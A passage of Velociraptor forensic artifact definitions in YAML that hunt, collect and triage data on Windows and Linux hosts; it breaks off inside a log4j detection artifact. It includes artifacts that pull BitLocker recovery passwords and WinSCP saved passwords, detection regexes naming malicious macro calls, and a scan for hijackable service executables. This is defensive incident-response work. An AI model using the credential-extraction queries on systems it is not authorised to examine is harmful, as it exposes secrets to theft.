        AND NOT DomainName =~ '^(NT AUTHORITY|FONT DRIVER HOST|WINDOW MANAGER)$'

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Sys.SystemdTimer.yaml
======
name: Linux.Sys.SystemdTimer

author: Wes Lambert - @therealwlambert

description: List and parse content of Systemd timers. 

reference:
  - https://www.digitalforensics.ch/nikkel18.pdf
  - https://lloydrochester.com/post/unix/systemd-timer-example/
    
parameters:
  - name: TimerLocation
    default: /lib/systemd/system/*.timer,/usr/lib/systemd/system/*.timer,/etc/systemd/system/*.timer,~/.config/systemd/user/*.timer
    description: The location of Systemd timers
    
sources:
  - precondition: |
      SELECT OS From info() where OS = 'linux'
    queries:
      - |
        SELECT *, read_file(filename=OSPath) FROM glob(globs=split(string=TimerLocation, sep=","))

---END OF FILE---

======
FILE: /content/exchange/artifacts/LinuxMemoryAcquisition.yaml
======
name: Linux.Memory.Acquisition
author: URCA (Corentin Garcia / Emmanuel Mesnard)
description: |
  Acquires a full memory image. We download LiME and use it to acquire
  a full memory image.

  NOTE: This artifact usually transfers a lot of data. You should
  increase the default timeout to allow it to complete.  ( Example :
  2Gb of memory time takes about 50s )


required_permissions:
  - EXECVE

tools:
  - name: LiME
    url: https://github.com/504ensicsLabs/LiME/archive/refs/heads/master.zip
  - name: Volatility
    url: https://github.com/volatilityfoundation/volatility/archive/master.zip

parameters:
    - name: StartVolatility
      type: bool
      default: Y
    - name: Zipname
      type: string
      description: Name of the zip containing the Volatility profile
      default: Ubuntu
    - name: Dumpname
      type: string
      description: Name of the memory dump
      default: dump

precondition: SELECT OS From info() where OS = 'linux'

sources:
  - queries:
    - LET Volatility = SELECT * FROM Artifact.Exchange.Linux.Volatility.Create.Profile(Zipname=Zipname)

      LET Lime = SELECT FullPath, Stdout, Stderr, if(condition=Complete, then=upload(file="/tmp/" + Dumpname + ".raw", name=Dumpname + ".raw")) As Upload FROM execve(argv=['bash', '-c', 'mv /tmp/master.zip /tmp/lime-master.zip ; unzip -o /tmp/lime-master.zip -d /tmp/ ; cd /tmp/LiME-master/src/ ; apt-get -y install build-essential linux-headers-$(uname -r) ; make ; insmod /tmp/LiME-master/src/lime-*.ko "path=/tmp/"' + Dumpname + '".raw format=lime"'])

      LET dirtmp = tempdir(remove_last=true)

      SELECT * FROM foreach(
          row={
            SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="LiME")
          },
          query={
            SELECT * FROM chain(
            a={SELECT * FROM Lime},
            b={SELECT * FROM execve(argv=['bash', '-c', 'mv /tmp/LiME-master /tmp/lime-master.zip /tmp/' + Dumpname + '.raw ' + dirtmp])},
            c={SELECT * FROM if(
                condition=StartVolatility,
                then=Volatility,
                else=scope()
            )}
            )
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/ProcessRemediation.yaml
======
name: Windows.Remediation.Process
author: Matt Green - @mgreen27
description: |
  This artifact enables killing a process by Name, Path or PID.
  
  WARNING: This is dangerous content as there are no guardrails. 
  Scope remediation first then ReallyDoIt to kill process.
  
type: CLIENT
parameters:
  - name: ProcessNameRegex
    default: ^malware.exe$
    type: regex
  - name: ProcessPathRegex
    default: .
    type: regex
  - name: ProcessCliRegex
    default: .
    type: regex
  - name: PidRegex
    default: .
    type: regex
  - name: ReallyDoIt
    description: When selected will really remove!
    type: bool  


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- find velociraptor process
      LET me = SELECT Pid FROM pslist(pid=getpid())

      -- find all processes and add filters
      LET targets = SELECT Name as ProcessName, Exe, CommandLine, Pid
        FROM pslist()
        WHERE TRUE
            AND Name =~ ProcessNameRegex
            AND Exe =~ ProcessPathRegex
            AND CommandLine =~ ProcessCliRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND NOT Pid in me.Pid
            AND NOT upcase(string=Exe) in whitelist.Path
        
      SELECT * , 
        if( condition = ReallyDoIt,
            then = pskill(pid=Pid),
            else = False 
                ) as Killed
      FROM targets

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.NetworkConfig.yaml
======
name: Linux.Collection.NetworkConfig
author: alternate
description: |
  Collect network config files and upload them.
  Based on TriageNetwork from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: DNSResolvConfFile
  default: /etc/resolv.conf

- name: HostAccessPolicyConfiguration
  default: |
    ["/etc/hosts.allow","/etc/hosts.deny"]

- name: LinuxHostnameFile
  default: /etc/hostname

- name: LinuxIgnoreICMPBroadcasts
  default: /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

- name: LinuxNetworkIpForwardingState
  default: |
    ["/proc/sys/net/ipv*/conf/*/forwarding","/proc/sys/net/ipv4/conf/*/mc_forwarding",
     "/proc/sys/net/ipv4/ip_forward"]

- name: LinuxNetworkPathFilteringSettings
  default: |
    ["/proc/sys/net/ipv*/conf/*/accept_source_route","/proc/sys/net/ipv4/conf/*/rp_filter",
     "/proc/sys/net/ipv4/conf/*/log_martians"]

- name: LinuxNetworkRedirectState 
  default: |
    ["/proc/sys/net/ipv*/conf/*/accept_redirects","/proc/sys/net/ipv4/conf/*/secure_redirects",
     "/proc/sys/net/ipv4/conf/*/send_redirects"]

- name: LinuxProcArp
  default: /proc/net/arp

- name: LinuxSyncookieState
  default: /proc/sys/net/ipv4/tcp_syncookies

- name: UFWConfigFiles
  default: |
    ["/etc/default/ufw","/etc/ufw/sysctl.conf","/etc/ufw/*.rules","/etc/ufw/applications.d/*"]

- name: IPTablesConfigFiles
  default: |
    ["/etc/sysconfig/iptables*","/etc/sysconfig/ip6tables*"]

- name: UnixHostsFile
  default: /etc/hosts

sources:
- name: uploadDNSResolvConfFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=DNSResolvConfFile)

- name: uploadHostAccessPolicyConfiguration
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=HostAccessPolicyConfiguration))

- name: uploadLinuxHostnameFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxHostnameFile)
 
- name: uploadLinuxIgnoreICMPBroadcasts
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxIgnoreICMPBroadcasts)

- name: uploadLinuxNetworkIpForwardingState
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxNetworkIpForwardingState))

- name: uploadLinuxNetworkPathFilteringSettings
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxNetworkPathFilteringSettings))

- name: uploadLinuxNetworkRedirectState
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxNetworkRedirectState))

- name: uploadLinuxProcArp
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxProcArp)

- name: uploadLinuxSyncookieState
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxSyncookieState)

- name: uploadUFWConfigFiles
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UFWConfigFiles))

- name: uploadIPTablesConfigFiles
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=IPTablesConfigFiles))

- name: uploadUnixHostsFile
  query: | 
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=UnixHostsFile)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Telegram.Clients.Enrolled.yaml
======
name: Server.Telegram.Clients.Enrolled
author: "td - @tuedenn"
description: |
   Send a message to telegram when clients become enrolled.

   This artifact triggers when a client is interrogated within 60
   seconds of it being seen for the first time. You can manually
   configure information such as FirstSeenDelay, timestamp, etc.

   Inspired by `Server.Slack.Clients.Enrolled`.
type: SERVER_EVENT

parameters:
  - name: FirstSeenDelay
    default: "60"
    type: int
    description: |
        The time between first_seen_time and Generic.Client.Info collection.
  - name: TeleChatID
    description: |
        The chat_id of the group chat you want to send messages to.
        e.g: -872161xxx
  - name: TeleURL
    description: |
        The url of your bot API be used to send message.
        e.g: https://api.telegram.org/bot66666xxxxx:AAGukJg5LXgPkxxxtVU2Smbtrf0tnVuNxxx/sendMessage

sources:
  - query: |
        LET chatID = if(
                   condition=TeleChatID,
                   then=TeleChatID,
                   else=server_metadata().TeleID)

        LET urlTele = if(
                   condition=TeleURL,
                   then=TeleURL,
                   else=server_metadata().TeleURL)

        -- Returns an event for each interrogation that occurs within 60 seconds
        -- of first seen timestamp.

        LET completions = SELECT client_id AS ClientId,
                         os_info.hostname AS Hostname,
                         os_info.fqdn AS Fqdn,
                         last_ip AS LastIP,
                         os_info.system AS OS,
                         os_info.release AS OSrelease,
                         timestamp(epoch=first_seen_at) AS FirstSeen,
                         timestamp(epoch=last_seen_at) AS LastSeen,
                         timestamp(epoch=now()) AS Now
        FROM clients()
        WHERE last_interrogate_artifact_name = "Generic.Client.Info/BasicInformation"
        AND first_seen_at > now() - FirstSeenDelay

        -- Sends the message to a telegram group.
        LET SendToTele(Message) = SELECT *
            FROM http_client(
              method="POST",
              headers=dict(`Content-Type`="application/json"),
              data=serialize(
              format="json", item=dict(chat_id=chatID, text=Message)),
              url=urlTele)

        LET send_message = SELECT *
        FROM foreach(
          row=completions,
          query={
            SELECT Content, Response, Headers.Date
            FROM SendToTele(
              Message=format(
                format="[Info] New client has been enrolled!\nTime: %v!\nHostname: %s\nIP: %s\nOS: %v",
                args=[FirstSeen, Hostname, LastIP, OSrelease]))
        })

        -- Check every minute using clock() plugin
        SELECT * FROM foreach(
        row={
          SELECT * FROM clock(period=FirstSeenDelay
          )},
        query=send_message)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.Chainsaw.yaml
======
name: Windows.EventLogs.Chainsaw
description: |

    This artifact leverages Chainsaw to enable usage of Sigma rules
    (in addition to built-in rules) to faciliate detection within
    Windows Event Logs.

    From the project's description:

    "Chainsaw provides a powerful ‘first-response’ capability to
    quickly identify threats within Windows event logs.  It offers a
    generic and fast method of searching through event logs for
    keywords, and by identifying threats using built-in detection
    logic and via support for Sigma detection rules."

    https://github.com/countercept/chainsaw

author: Wes Lambert - @therealwlambert, James Dorgan - @FranticTyping, Alex Korntizer - @AlexKornitzer
tools:
  - name: Chainsaw
    url: https://github.com/WithSecureLabs/chainsaw/releases/download/v2.9.0/chainsaw_all_platforms+rules+examples.zip
    version: 2.9.0
    expected_hash: 9f809ea14b71e7c53fde8ebef7f3a82881f4dcacec97566b29cc914324667eda
     
precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: EVTXPath
    default: 'C:\Windows\System32\winevt\Logs'
  - name: ExecLength
    description: Size (in bytes) of output that will be returned for a single row for execve().  This value may need to be adjusted depending on the size of your event logs.
    type: int
    default: "100000000"
  - name: JSONLength
    description: Size (in bytes) of output that will be returned for a single row for parse_json_array().  This value may need to be adjusted depending on the size of your event logs.
    type: int
    default: "100000000"

sources:
  - query: |
        LET Toolzip <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Chainsaw", IsExecutable=FALSE)
        LET TmpDir <= tempdir()
        LET TmpResults <= tempfile()
        LET UnzipIt <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)
        LET SigmaRules <= TmpDir + '\\chainsaw\\sigma\\rules'
        LET ChainsawRules <= TmpDir + '\\chainsaw\\rules'
        LET SigmaMapping <= TmpDir + '\\chainsaw\\mappings\\sigma-event-logs-all.yml'
        LET ExecCS <= SELECT * FROM execve(argv=[
                        TmpDir + '\\chainsaw\\chainsaw_x86_64-pc-windows-msvc.exe',
                        'hunt', EVTXPath,
                        "-s", SigmaRules,
                        "-r", ChainsawRules,
                        "--mapping", SigmaMapping,
                        "--json",
                        "--output", TmpResults], length=ExecLength)
        SELECT  get(member="document.data.Event.System.TimeCreated_attributes.SystemTime") AS EventTime,
                get(member="name") AS Detection,
                get(member="level") AS Severity,
                get(member="status") AS Status,
                get(member="group") AS `Rule Group`,
                get(member="document.data.Event.System.Computer") AS Computer,
                get(member="document.data.Event.System.Channel") AS Channel,
                get(member="document.data.Event.System.EventID") AS EventID,
                get(member="document.data.Event.EventData.User") AS _User,
                get(member="document.data.Event.System") AS SystemData,
                get(member="document.data.Event.EventData") AS EventData,
                get(member="authors") AS Authors
        FROM parse_json_array(data=read_file(filename=TmpResults, length=JSONLength))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Ollama.yaml
======
name: Server.Enrichment.AI.Ollama
author: Matt Green - @mgreen27
description: |
  This artifact allows enrichment using Ollama AI. 
  
  Paramaters:
  
  * `PrePrompt` - Is initial prompt default is: "You are a Cyber Incident 
  Responder and need to analyze data. You have an eye for detail and like to use 
  short precise technical language. Analyze the following data and provide 
  summary analysis:"  
  * `Prompt` - Is secondary prompt, good practice is add some strings related to 
  the type of data for analysis or artifact name to provide context.
  * `PromptData` - add object to be serialized and added to the prompt.
  * `Model` - Model to use for your request.
  * `TargetUri` - Ollama target URI
  * `MaxPromptSize` - If set will cut the final prompt to this size in bytes to 
  assist maintaining context limits
  
  This artifact can be called from within another artifact (such as one looking 
  for files) to enrich the data made available by that artifact.

type: SERVER

parameters:
    - name: PrePrompt
      type: string
      description: A prefix to be used with the prompt. For example, when asking a question, then providing data separately
      default: 'You are a Cyber Incident Responder and need to analyze data. You have an eye for detail and like to use short precise technical language. Analyze the following data and provide summary analysis:  '
    - name: Prompt
      type: string
      description: A prompt - added to the middle of an AI request.
      default: "Add name of data here - e.g Windows.Forensics.Prefetch"
    - name: PromptData
      type: string
      description: The data sent to Ollama - this data is serialised and added to the prompt
    - name: Model
      type: string
      description: The model used for processing the prompt
      default: 'mistral'
    - name: TargetUri
      type: string
      description: TargetUri to send request
      default: "http://127.0.0.1:11434/api/generate"
    - name: MaxPromptSize
      type: int
      description: Will limit your prompt to this size in bytes. Helps maintain context sizes.


sources:
  - query: |
        LET FinalPrompt = if(condition= MaxPromptSize, 
            then = (PrePrompt + " " + Prompt + " " + serialize(item=PromptData))[:MaxPromptSize],
            else= PrePrompt + " " + Prompt + " " + serialize(item=PromptData) )
        
        SELECT FinalPrompt AS Prompt, 
            parse_json(data=Content).response AS ResponseText,
            parse_json(data=Content) AS ResponseDetails
        FROM http_client(
            url=TargetUri,
            headers=dict(`Content-Type`="application/json"),
            method="POST",
            data=dict(model=Model, prompt=FinalPrompt, stream=false)
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Sys.BitLocker.yaml
======
name: Windows.Sys.BitLocker
author: Zane Gittins
description: |
   This artifact gets all Bitlocker volumes using PowerShell, including the recovery password.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET PowershellScript = '''$Results = @()
        $BitlockerVolumes = Get-BitLockerVolume
        $BitlockerVolumes |
        ForEach-Object {
            $RecoveryKey = [string]($_.KeyProtector).RecoveryPassword
            # Only add results with valid recovery keys.
            if ($RecoveryKey.Length -gt 5) {
                $_ | Add-Member -MemberType NoteProperty -Name "RecoveryPassword" -Value $RecoveryKey
                $Results += $_
            }
        }
        
        return ConvertTo-Json -InputObject @($Results)
        '''
        SELECT * FROM foreach(
          row={
            SELECT Stdout FROM execve(argv=["Powershell", "-ExecutionPolicy",
                "unrestricted", "-c", PowershellScript], length=1000000)
          }, query={
            SELECT * FROM parse_json_array(data=Stdout)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Custom.Windows.WinSCP.Passwords.yaml
======
name: Windows.WinSCP.Passwords
author: "Yaron King - @Sam0rai"
description: |
   Extract WinSCP obfuscated saved passwords from registry.
   Further information regarding deobfuscation can be found here: https://www.xmcyber.com/blog/extracting-encrypted-credentials-from-common-tools-2/

type: CLIENT

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: HKEY_USERS\\S-1-5-21-*\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\*\\password
    description: Use a glob to define the registry path to search for saved passwords.

sources:
  - query: |
        SELECT Data.value as ObfuscatedPassword, FullPath, ModTime
        FROM glob(globs=SearchRegistryGlob, accessor='reg')

---END OF FILE---

======
FILE: /content/exchange/artifacts/ThumbCache.yaml
======
name: Windows.Forensics.ThumbCache
author: "Yogesh Khatri - @SwiftForensics / CyberCX"
description: |
    ThumbCache_xx.db parser. 
    
    Windows 8 and above is supported. This does NOT parse Win7/Vista caches.
    
    By default, for resident files, the NAME field in a cache entry contains the
    ASCII equivalent of the cache id, a 64 bit number. However for some deleted 
    files and files residing on external hosts or external storage, there is 
    either a file name, full UNC path or an alternate representation such as:
        ```<VOLUME NAME>?<VOLUME NUMBER>?<FILENAME> ```  
        or  
        ```<VOLUME NAME>?<VOLUME NUMBER>?<MFT REFERENCE NUMBER>```  
        or  
        ```\\<hostname>\c$\<file path>```
        
    This artifact <b>omits</b> the default resident files by removing any entries that 
    look like the cache ids leaving behind the <b>interesting files</b>, usually 
    references to external disks or deleted files. At times there are references
    to external files that may be useful to an investigation, when other 
    artifacts have been removed.

reference:
    - https://github.com/jas502n/010-Editor-Template/blob/main/ThumbCache.bt
    - https://www.hackerfactor.com/blog/index.php?/archives/360-Thumbs-Up.html

type: CLIENT

parameters:
   - name: GlobPath
     default: "C:/Users/**/AppData/Local/Microsoft/Windows/Explorer/thumbcache_*.db"
     description: Change this to scan custom folders
     
   - name: MaxCountPerFile
     default: 10000
     type: int64
     description: Don't change unless you have a good reason to. By default, the max count is far less than this.

   - name: NameRegex
     default: .
     type: regex
     description: Regex to filter on Name field. E.g Add ^\\\\ to hunt for UNC path.
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      
      LET ProfileX = '''
        [
           ["Header", 0, [
              ["Signature", 0, "String", { "length": 4 }],
              ["Version", 4, "Enumeration", {
                  "type": "uint32",
                  "map": {
                            "WINDOWS_VISTA" : 0x14,
                            "WINDOWS_7"     : 0x15,
                            "WINDOWS_8"     : 0x1A,
                            "WINDOWS_8v2"   : 0x1C,
                            "WINDOWS_8v3"   : 0x1E,
                            "WINDOWS_8_1"   : 0x1F,
                            "WINDOWS_10"    : 0x20,
                  }
              }
              ],
              ["HeaderSize", 16, "uint32"],
              ["records", "x=>x.HeaderSize", "Array", {
                  "type": "Entry",
                  "max_count": "x=>MaxCountPerFile",
                  "count": "x=>MaxCountPerFile",
              }]
            ]],
           ["Entry", "x=>x.Size", [
              ["Signature", 0, "String", { "length": 4 }],
              ["Size", 4, "uint32"],
              ["NameSize", 16, "uint32"],
              ["Name", 56, "String", {"encoding": "utf16", "length": "x=>x.NameSize"}]
             ],
            ]
        ]
        '''
   
        LET targets <= SELECT OSPath, 
            read_file(filename=OSPath,offset=0,length=4) as _Header
            FROM glob(globs=GlobPath)
            WHERE NOT IsDir 
              AND OSPath =~ "thumbcache_[0-9]+\.db"
              AND _Header =~ '^CMMM$'

        LET thumbcache_data <= SELECT OSPath,
            parse_binary(filename=OSPath,
                profile=ProfileX, struct="Header") AS Parsed 
        FROM targets
                WHERE NOT Parsed.Version IN ("WINDOWS_VISTA", "WINDOWS_7")
                
        SELECT OSPath, Name, Version FROM 
              foreach(row=thumbcache_data, query={
                  SELECT Name, OSPath, Parsed.Version as Version
                    FROM foreach(row=Parsed.records) 
              })
              WHERE Name
                  AND Name =~ NameRegex
                  AND NOT Name =~ "^[0-9a-fA-F]{14,16}$" 
                  AND NOT Name =~ "^::{"

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacroRaptor.yaml
======
name: Windows.Applications.OfficeMacros.MacroRaptor
author: Matt Green - @mgreen27
description: |
  This artifact implements OleTools MacroRaptor capability in VQL.
  
  Use as a Hunt or triage capability.

reference:
  - http://www.decalage.info/mraptor
  - https://github.com/decalage2/oletools/wiki/mraptor
  
parameters:
  - name: TargetGlob
    default: "C:\\Users\\**\\*.{doc,dot,docx,docm,dotx,dotm,docb,xls,xlt,xlm,xlsx,xlsm,xltx,xltm,xlsb,ppt,pptx,pptm,potx,potm}"
    description: The directory to search for office documents.
  - name: ShowAllDetections
    type: bool
    description: If selected return both Suspicious and non-suspicious.
  - name: UploadDocument
    type: bool
    description: "Upload documents. WARNING: Advised to not use with ShowAllDetections True as this may upload multiple versions of the same document."
  - name: AutoExecRegex
    default: "\\b(?:Auto(?:Exec|_?Open|_?Close|Exit|New)|Document(?:_?Open|_Close|_?BeforeClose|Change|_New)|NewDocument|Workbook(?:_Open|_Activate|_Close|_BeforeClose)|\\w+_(?:Painted|Painting|GotFocus|LostFocus|MouseHover|Layout|Click|Change|Resize|BeforeNavigate2|BeforeScriptExecute|DocumentComplete|DownloadBegin|DownloadComplete|FileDownload|NavigateComplete2|NavigateError|ProgressChange|PropertyChange|SetSecureLockIcon|StatusTextChange|TitleChange|MouseMove|MouseEnter|MouseLeave|OnConnecting))|Auto_Ope\\b"
  - name: WriteRegex
    default: "\\b(?:FileCopy|CopyFile|Kill|CreateTextFile|VirtualAlloc|RtlMoveMemory|URLDownloadToFileA?|AltStartupPath|WriteProcessMemory|ADODB\\.Stream|WriteText|SaveToFile|SaveAs|SaveAsRTF|FileSaveAs|MkDir|RmDir|SaveSetting|SetAttr)\\b|(?:\\bOpen\\b[^\\n]+\\b(?:Write|Append|Binary|Output|Random)\\b)"
  - name: ExecRegex
    default: "\\b(?:Shell|CreateObject|GetObject|SendKeys|RUN|CALL|MacScript|FollowHyperlink|CreateThread|ShellExecuteA?|ExecuteExcel4Macro|EXEC|REGISTER|SetTimer)\\b|(?:\\bDeclare\\b[^\\n]+\\bLib\\b)"

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- firstly match regex for macro code of interest
      LET macros = SELECT * FROM foreach(
            row={
                SELECT OSPath,Name,Size,Mtime,Atime,Ctime,Btime FROM glob(globs=TargetGlob)
            },
            query={
                SELECT 
                    OSPath,Name,Size,
                    dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime) as Timestamps,
                    dict(
                        AutoExec = if(condition= Code=~AutoExecRegex,
                                then= True,
                                else= False),
                        Write = if(condition= Code=~WriteRegex,
                                then= True,
                                else= False),
                        Execute = if(condition= Code=~ExecRegex,
                                then= True,
                                else= False)
                            ) as MacroDetection,
                    dict(Type=Type,StreamName=StreamName,ModuleName=ModuleName,Code=Code) as MacroCode
                FROM olevba(file=OSPath)
                WHERE Code =~ AutoExecRegex OR Code =~ WriteRegex OR Code=~ ExecRegex
            })
      
      -- determine if suspicious
      LET results = SELECT 
            OSPath,Name,Size,Timestamps,
            if(condition= MacroDetection.AutoExec AND ( MacroDetection.Write OR MacroDetection.Execute ),
                then = True,
                else= False ) as Suspicious,
            MacroDetection,
            MacroCode
        FROM macros
        WHERE if(condition= ShowAllDetections,
            then= True,
            else= Suspicious)
        
      -- upload hits to server
      LET upload_results = SELECT *, upload(file=OSPath) as Upload
        FROM results

      -- output rows
      SELECT *,
        hash(path=OSPath) as Hash
      FROM if(condition= UploadDocument,
            then= { SELECT * FROM upload_results},
            else= { SELECT * FROM results})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Services.Hijacking.yaml
======
name: Windows.Services.Hijacking
description: |
   Service Executable Hijacking is a misconfiguration flaw, where a service runs an executable which has 
   overly permissive permissions on it (for example: "Full Control" permissions to "Authenticated Users").
   If a service runs under the security context of a user with high permissions (such as: NT Authority\SYSTEM), 
   and an attacker with low privileges is able to modify the executable that service is running (such as 
   replacing it with their own) - the service could run that executable with high privileges.
   
   This hunt finds all Windows services which are vulnerable to service executable hijacking. 
   It does so in the following manner:
   1. Enumerate all services, and extract the full path of their executables.
   2. Run an external Powershell script to enumerate the ACLs of those executables.
   3. Display all relevant information regarding found vulnerable services.
   
   #services #hijacking

author: "Yaron King - @Sam0rai"

type: CLIENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET services = SELECT *
        FROM  Artifact.Windows.System.Services()

        LET Script <= tempfile(data='''
                $glob = $args[0]
                $pathsArray = $glob -split ";"
                $aclArray = @()
                foreach($filePath in $pathsArray) {
                foreach($acl in (Get-Acl $filePath).Access) {
                $obj = new-object PSObject -Property @{
                FilePath          = $filePath
                IdentityReference = $acl.IdentityReference.Value
                FileSystemRights  = $acl.FileSystemRights
                IsInherited       = $acl.IsInherited
                InheritanceFlags  = $acl.InheritanceFlags
                PropagationFlags  = $acl.PropagationFlags
                }
                $aclArray += $obj
                }
                }
                $aclArray | ConvertTo-Json
                        ''', extension=".ps1")
        
        Let servicesPath = Select AbsoluteExePath, count() AS Count
            FROM services
            GROUP BY AbsoluteExePath
        
        LET ExecutableACLs = SELECT * FROM foreach(
          row={
            SELECT Stdout FROM execve(argv=["Powershell", "-ExecutionPolicy",
                "bypass", "-file", Script, join(array=servicesPath.AbsoluteExePath, sep=";")], length=1000000)
          }, query={
            SELECT * FROM parse_json_array(data=Stdout)
        })
        
        // Dictionary of hard-coded File System Rights index numbers to human-readable strings
        LET FileSystemRightsDict = dict(
            `2032127`   = "Full Control",
            `1180063`   = "Read, Write",
            `1245631`   = "Change",
            `1180095`   = "ReadAndExecute, Write",
            `268435456` = "FullControl (Sub Only)")

        LET ExecutableACLs_Filtered = SELECT FilePath, IdentityReference, get(item=FileSystemRightsDict, member=str(str=FileSystemRights)) AS Permissions, FileSystemRights, IsInherited, InheritanceFlags, PropagationFlags
        FROM ExecutableACLs
        WHERE (
            IdentityReference != "BUILTIN\\Administrators" and
            IdentityReference != "NT AUTHORITY\\SYSTEM" and
            IdentityReference != "NT SERVICE\\TrustedInstaller"
        ) 
        and (
            FileSystemRights = 2032127 or -- NTFS permission "Full Control" 
            FileSystemRights = 1180063 or -- NTFS permission "Read, Write"
            FileSystemRights = 1245631 or -- NTFS permission "Change"
            FileSystemRights = 1180095 or -- NTFS permission "ReadAndExecute, Write"
            FileSystemRights = 268435456  -- NTFS permission "FullControl (Sub Only)"  
        )
        
        SELECT * FROM foreach(
            row={SELECT * FROM ExecutableACLs_Filtered},
            query={
                SELECT Name, DisplayName, State, Status, StartMode, PathName, AbsoluteExePath as Command, UserAccount, Permissions, IdentityReference as UserWithPermissions, Created
                FROM services
                WHERE AbsoluteExePath = FilePath
            }
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.Network.Changed.yaml
======
name: Windows.Detection.Network.Changed
author: Zane Gittins
description: |
   Detects when a new network is added or removed from the system via the NetworkList registry keys.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT_EVENT


parameters:
  - name: Period
    default: 60
    type: int64
    description: The period to check the registry.
  - name: Globs
    type: string
    default: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles\\**\\*"
    description: The registry path to search


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'


    query: |
      SELECT * FROM diff(key="NetworkName", period=Period, query={
          SELECT Data.value as NetworkName from glob(accessor="reg",globs=Globs) WHERE Name=~"ProfileName" 
      })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.AnyDesk.LogParser.yaml
======
name: Windows.Applications.AnyDesk.LogParser
description: |
   Parses the AnyDesk ad.trace log file.

   Info such as connection times, clipboard activity, and remote host information are captured.

author: Rob Homewood, angry-bender and Yogesh Khatri (@swiftforensics)

type: CLIENT
parameters:
    - name: FileGlob
      default: C:\Users\*\AppData\Roaming\Anydesk\ad.trace

sources:
    - query: |

        -- Grabs file path of provided file glob
        LET InputLogPath <= SELECT FullPath 
        FROM glob(globs=FileGlob)

        -- Parses file against regex
        LET parse_log <= SELECT
            parse_string_with_regex(
                string=Line,
                regex= ['''\s+(?P<Info>(info)\s+)''', 
                       '''(?P<Date>\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})''',
                       '''(\d{4,}.*?)(?P<PPID>\b\d{4,5}\b)''',
                       '''\b\b\d{4,5}.*(?P<PID>\b\b\d{4,5}\b)''',
                       '''(?P<Message>(anynet.relay_conn|anynet.any_socket|app.local_file_transfer|app.prepare_task|app.local_file_transfer|app.ctrl_clip_comp|app.backend_session|app.ft_src_session|app.ctrl_clip_comp)\s-\s\w.*)'''])
                       as Record
                       FROM parse_lines(filename=InputLogPath.FullPath)
                    
        -- Prints matching data where there is an entry in Record.Message                    
        SELECT Record.Date as Date, Record.PPID as PPID, Record.PID as PID, Record.Message as Message,
        -- Extracts IP address from Message field and adds to its own column
        if(condition=Record.Message=~"External", then=parse_string_with_regex(string=Record.Message, regex="((?:[0-9]{1,3}[\\.]){3}[0-9]{1,3})")).g1 AS ExternalIPAddress,
        -- Extracts remote IP address from Message field and adds to its own column
        if(condition=Record.Message=~"Logged in from ", then=parse_string_with_regex(string=Record.Message, regex="((?:[0-9]{1,3}[\\.]){3}[0-9]{1,3})")).g1 AS RemoteIP
        FROM parse_log 
        WHERE Record.Message

---END OF FILE---

======
FILE: /content/exchange/artifacts/log4jRCE.yaml
======
name: Generic.Detection.log4jRCE
author: Matt Green - @mgreen27
description: |
  Detection for exploitation attempts against log4j RCE
  vulnerability CVE-2021-44228.

  By default this artifact will search for linux path glob: /var/logs/**

  For Windows hosts please change the target path.
  Some examples of path glob may include:

  * Specific binary: `/var/logs/log.gz`
